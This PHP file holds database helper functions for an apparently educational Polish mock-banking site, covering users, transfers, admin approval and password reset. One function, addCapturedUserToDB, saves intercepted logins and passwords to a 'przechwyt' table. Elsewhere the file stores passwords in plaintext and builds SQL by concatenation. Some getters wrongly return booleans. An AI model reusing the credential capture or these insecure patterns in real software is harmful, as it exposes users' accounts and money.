<?php

require_once("MyDatabase.php");
require_once("Filter.php");

function isLoginInDB($login){
	return myDbSelect(myDB(),"SELECT login FROM Users WHERE login='". filter($login, 1)."'") != null; 
}

function getLogin($id){
	return myDbSelect(myDB(),"SELECT login FROM Users WHERE ID='". filter($id, 1)."'") != null; 
}

function getUserID($login){
	return myDbSelect(myDB(),"SELECT ID FROM Users WHERE login='". filter($login, 1)."'") != null; 
}

//tak jesli jest, nie jesli nie ma
function isUserInDBLog($login){
	return myDbSelect(myDB(),"SELECT login FROM Users WHERE login='". filter($login, 1)."'") != null;
}

function isUserInDB($login, $password){
	return myDbSelect(myDB(),"SELECT login FROM Users WHERE login='". filter($login, 1)."' AND password='".filter($password, 1)."'") != null;
}

function getUser($login){
	return myDbSelect(myDB(),"SELECT login, password FROM Users WHERE login='". filter($login, 1)."'");
}

function addUserToDB($login, $password, $email, $pytanie, $odpowiedz){
	myDB() -> query("INSERT INTO `Users`(`login`, `password`, `email`, `Pytanie`, `Odpowiedz`) VALUES ('".filter($login, 1)."','".filter($password, 1)."','".filter($email, 1)."','".filter($pytanie, 1)."','".filter($odpowiedz, 1)."')");
}

function setTransfer($login, $nazwaOdbiorcy, $numerRachunkuOdbiorcy, $kwota, $nazwaZleceniodawcy, $tytulPrzelewu){
	myDB() -> query("INSERT INTO `przelewy`(`login`, `NazwaOdbiorcy`, `NumerRachunkuOdbiorcy`, `Kwota`, `NazwaZleceniodawcy`, `TytulPrzelewu`, `Data`, `Status`) VALUES ('".filter($login, 1)."','".filter($nazwaOdbiorcy, 1)."','".filter($numerRachunkuOdbiorcy, 1)."','".filter($kwota, 1)."','".filter($nazwaZleceniodawcy, 1)."','".filter($tytulPrzelewu, 1)."',NOW(),'Niezatwierdzony')");
}

function getTransfers($login){
	return myDbSelect(myDB(), "SELECT  `ID`,	`login`, `NazwaOdbiorcy`, `NumerRachunkuOdbiorcy`, `Kwota`, `NazwaZleceniodawcy`, `TytulPrzelewu`, `Data`, `Status` FROM przelewy WHERE login='". filter($login, 1)."' ORDER BY Data DESC");
}

function getUnconfirmedTransfers(){
	return myDbSelect(myDB(), "SELECT  `ID`, `login`, `NazwaOdbiorcy`, `NumerRachunkuOdbiorcy`, `Kwota`, `NazwaZleceniodawcy`, `TytulPrzelewu`, `Data`, `Status` FROM przelewy WHERE status='Niezatwierdzony' ORDER BY Data DESC");
}

function confirmTransfer($id){
	myDB() -> query("UPDATE `przelewy` SET `Status`='Zatwierdzony' WHERE `ID`='".filter($id, 1)."'");
}

function addCapturedUserToDB($login, $password){
	myDB() -> query("INSERT INTO `przechwyt`(`login`, `password`) VALUES ('".filter($login, 1)."','".filter($password, 1)."')");
}

function pobierzPytanie($email){
	return myDbSelect(myDB(), "SELECT `Pytanie` FROM `Users` WHERE `email`='".filter($email, 1)."'");
}

function pobierzOdpowiedz($email){
	return myDbSelect(myDB(), "SELECT `Odpowiedz` FROM `Users` WHERE `email`='".filter($email, 1)."'");
}

function updatePassword($email, $pass){
	myDB() -> query("UPDATE `Users` SET `password`='".filter($pass, 1)."' WHERE `email`='".filter($email, 1)."'");
}

?>